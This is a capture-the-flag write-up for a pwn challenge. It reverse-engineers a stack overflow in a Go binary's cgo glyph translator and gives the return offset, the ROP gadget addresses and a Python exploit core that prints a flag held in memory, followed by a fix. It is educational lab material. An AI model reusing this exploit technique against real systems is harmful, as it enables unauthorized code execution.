# Runeforge — Pwn Challenge Write-up

## Summary

`runeforge` is a stripped, statically linked x86-64 Go binary that uses cgo to call a native glyph-translation routine. The Go front end is mostly presentation; the actual bug is in the C fallback path for unknown glyphs.

The native routine copies an attacker-controlled line into a 128-byte stack buffer using the full input length and no bounds check. The return address is 184 bytes from the start of that buffer. Because the binary is non-PIE and the vulnerable routine has no stack canary, the overflow gives reliable ROP control.

At startup, the program reads `flag.txt`, converts it to a Go string, stores that string in a fixed global, and deletes the file. The exploit dereferences the global string pointer and length, then invokes the `write` syscall to print the flag.

**Local verification flag:**

```text
Cyberthon{PLACEHOLDER_run_against_the_real_service}
```

The distributed binary intentionally uses that placeholder when `flag.txt` is absent. The real flag must be obtained by running the exploit against the challenge service.

---

## 1. Initial reconnaissance

Binary hash:

```text
SHA-256: e252ec72552787460865edcb4bc032a43c708b68b7fb452145a12bc5e284d61e
```

Relevant properties:

| Property | Result |
|---|---|
| Architecture | x86-64 |
| Linking | Static |
| PIE | Disabled (`ET_EXEC`) |
| NX | Enabled; stack is RW, not executable |
| Symbols | ELF symbol table stripped |
| Go metadata | Present in `.gopclntab` |
| Vulnerable-function canary | None |

Although ordinary symbols are stripped, Go’s `.gopclntab` still exposes function names. The important Go functions include:

```text
main.init.0
main._Cfunc_translate_glyphs
main.translateGlyphs
main.main
```

Following the cgo wrapper leads to the native translator at `0x496a50`.

---

## 2. Finding where the flag lives

`main.init.0` starts at `0x4946e0`. Its logic is equivalent to:

```go
func init() {
    data, err := os.ReadFile("flag.txt")
    if err != nil {
        flag = "Cyberthon{PLACEHOLDER_run_against_the_real_service}"
        return
    }

    flag = string(data)
    os.Remove("flag.txt")
}
```

The resulting Go string is stored at a fixed global address:

```text
0x626570  flag.data pointer
0x626578  flag.length
```

A Go string is a two-word structure: a pointer followed by a length. On the real service, `flag.data` points into the Go heap. Therefore, directly treating `0x626570` as the flag text would only print the pointer bytes; the exploit must dereference it first.

The deletion of `flag.txt` also explains why a simple `open/read/write` ROP chain is not the intended route: by the time user input is processed, the file has already been removed.

---

## 3. The vulnerable native routine

The cgo wrapper calls a function with the effective signature:

```c
int translate_glyphs(
    const char *input,
    int input_len,
    char *output,
    int output_len
);
```

The routine first checks whether the input begins with one of the known three-byte rune encodings. If it does, it copies the corresponding English meaning into the output buffer.

For an unknown glyph, it takes the “raw transcription” path. Reconstructed pseudocode:

```c
char scratch[128];

if (input_len > 0) {
    memcpy(scratch, input, input_len);   // vulnerability
}

scratch[input_len < 127 ? input_len : 127] = '\0';
reverse_string(scratch);

strncpy(output, scratch, output_len - 1);
output[output_len - 1] = '\0';
return 0;
```

The forced terminator at index 127 does not make the copy safe, because it is written **after** `memcpy` has already overflowed the stack.

The program reverses only the visible first 127 bytes. The saved return address and ROP chain begin later, so the reversal does not disturb control data.

The exploit starts with ASCII `A` bytes so it cannot accidentally enter the safe known-rune branch.

---

## 4. Calculating the return-address offset

The native function prologue is:

```asm
push r15
push r14
push r13
push r12
push rbp
push rbx
sub  rsp, 0x98
```

The vulnerable buffer begins at `rsp + 0x10` after the subtraction.

There are six saved registers, totaling `0x30` bytes. Therefore:

```text
return offset
= (0x98 - 0x10) + 0x30
= 0x88 + 0x30
= 0xb8
= 184 bytes
```

This offset was confirmed by executing a ROP chain locally.

---

## 5. Building the ROP chain

The binary is static and non-PIE, so all gadget and global addresses are fixed.

Useful gadgets:

| Address | Gadget |
|---|---|
| `0x4d7037` | `pop rax ; ret` |
| `0x460945` | `mov rax, qword ptr [rax] ; ret` |
| `0x41558f` | `mov rsi, rax ; ret` |
| `0x496b1e` | `pop rdi ; ret` |
| `0x466769` | `syscall ; ret` |
| `0x4884e5` | `mov rdx, rax ; ... ; add rsp, 0x10 ; pop rbp ; ret` |

The `0x4884e5` gadget transfers `RAX` into `RDX`. It additionally skips two stack words and pops one word into `RBP`, so the chain supplies three dummy values after it.

### Register setup

First, load the exact flag length:

```text
RAX = 0x626578
RAX = [RAX]       -> flag.length
RDX = RAX
```

Then load the flag data pointer:

```text
RAX = 0x626570
RAX = [RAX]       -> flag.data
RSI = RAX
```

Finally, invoke:

```c
write(1, flag.data, flag.length);
```

Using a raw syscall avoids calling back into the Go ABI from a corrupted cgo stack:

```text
RDI = 1           stdout
RSI = flag.data
RDX = flag.length
RAX = 1           SYS_write
syscall
```

After printing, the exploit uses syscall 231, `exit_group`, rather than syscall 60, `exit`:

```text
RDI = 0
RAX = 231         SYS_exit_group
syscall
```

This distinction matters because the vulnerable C code executes on a cgo worker thread. `exit` terminates only that thread and leaves the Go process hanging; `exit_group` terminates the entire process and closes the remote connection cleanly.

---

## 6. Exploit core

```python
OFFSET = 0xB8

POP_RAX = 0x4D7037
DEREF_RAX = 0x460945
MOV_RDX_RAX_ADJ = 0x4884E5
MOV_RSI_RAX = 0x41558F
POP_RDI = 0x496B1E
SYSCALL = 0x466769

FLAG_DATA = 0x626570
FLAG_LEN = 0x626578

chain = [
    # RDX = flag.length
    POP_RAX, FLAG_LEN,
    DEREF_RAX,
    MOV_RDX_RAX_ADJ,
    0, 0, 0,

    # RSI = flag.data
    POP_RAX, FLAG_DATA,
    DEREF_RAX,
    MOV_RSI_RAX,

    # write(1, RSI, RDX)
    POP_RDI, 1,
    POP_RAX, 1,
    SYSCALL,

    # exit_group(0)
    POP_RDI, 0,
    POP_RAX, 231,
    SYSCALL,
]

payload = b"A" * OFFSET + b"".join(p64(x) for x in chain)
```

The complete dependency-free exploit is provided as `runeforge_solve.py`.

---

## 7. Running the solver

Local binary:

```bash
chmod +x runeforge
python3 runeforge_solve.py --binary ./runeforge
```

Expected local output without a real `flag.txt`:

```text
[+] Cyberthon{PLACEHOLDER_run_against_the_real_service}
```

Remote service:

```bash
python3 runeforge_solve.py --remote HOST PORT
```

The solver handles the menu, sends the binary payload, reads the exact flag bytes, and extracts the `Cyberthon{...}` token from the ANSI-formatted output.

---

## 8. Root cause and remediation

The immediate bug is the unchecked copy:

```c
memcpy(scratch, input, input_len);
```

A safe version must reject oversized input or cap the copy before it occurs:

```c
size_t n = (size_t)input_len;
if (n >= sizeof(scratch)) {
    n = sizeof(scratch) - 1;
}

memcpy(scratch, input, n);
scratch[n] = '\0';
```

Additional hardening would include compiling the native component with stack protectors and PIE. However, those defenses do not replace the required bounds check.
